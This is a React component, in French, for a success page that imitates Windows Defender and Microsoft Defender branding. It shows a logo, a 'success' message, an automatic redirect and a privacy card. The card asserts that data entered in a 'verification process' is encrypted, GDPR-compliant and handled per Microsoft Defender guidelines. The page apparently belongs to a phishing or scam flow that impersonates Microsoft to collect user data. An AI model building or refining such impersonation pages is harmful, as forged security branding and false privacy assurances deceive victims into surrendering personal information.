import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import "./style.css";

export default function SuccessPage() {
  const navigate = useNavigate();
  const [visible, setVisible] = useState(false);

  useEffect(() => {
    // Start animation
    setVisible(true);

    // Redirection automatique après 5 secondes
    const timeout = setTimeout(() => navigate("/"), 5000);
    return () => clearTimeout(timeout);
  }, [navigate]);

  return (
    <div className={`container ${visible ? "fade-in" : ""}`}>
      {/* En-tête Windows Defender */}
      <header className="header">
        <div className="logo">
          <div className="microsoft-logo">
            <div className="logo-square orange"></div>
            <div className="logo-square green"></div>
            <div className="logo-square blue"></div>
            <div className="logo-square yellow"></div>
          </div>
          <h1 className="title">
            Windows
            <br />
            Defender
          </h1>
        </div>
      </header>

      {/* Message de succès */}
      <div className="success-message slide-up">
        <div className="success-icon">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
            <circle cx="12" cy="12" r="10" fill="#4CAF50" />
            <path
              d="M9 12l2 2 4-4"
              stroke="white"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
            />
          </svg>
        </div>
        <div className="success-content">
          <h2>Succès de l'opération</h2>
          <p>Redirection vers la page d'accueil...</p>
        </div>
      </div>

      {/* Carte de politique de confidentialité */}
      <div className="privacy-card">
        <div className="privacy-header">
          <div className="shield-icon">
            <svg width="40" height="40" viewBox="0 0 24 24" fill="none">
              <path
                d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"
                fill="#1976D2"
              />
              <rect x="9" y="9" width="6" height="6" rx="1" fill="white" />
              <path d="M9 9h6v6H9z" fill="#424242" />
            </svg>
          </div>
          <h3>
            Politique de confidentialité
            <br />
            Microsoft Defender
          </h3>
        </div>

        <div className="privacy-content">
          <p>
            Votre sécurité est notre priorité. Toutes les données saisies sont
            chiffrées et traitées selon les normes strictes RGPD. Aucune
            information personnelle ne sera partagée sans votre consentement
            explicite. Ce processus de vérification est conforme aux directives
            Microsoft Defender pour détecter et éviter toute tentative de
            fraude.
          </p>
          <p>
            Si vous avez des questions ou remarquez une activité suspecte,
            veuillez contacter notre support immédiatement.
          </p>
        </div>
      </div>
    </div>
  );
}
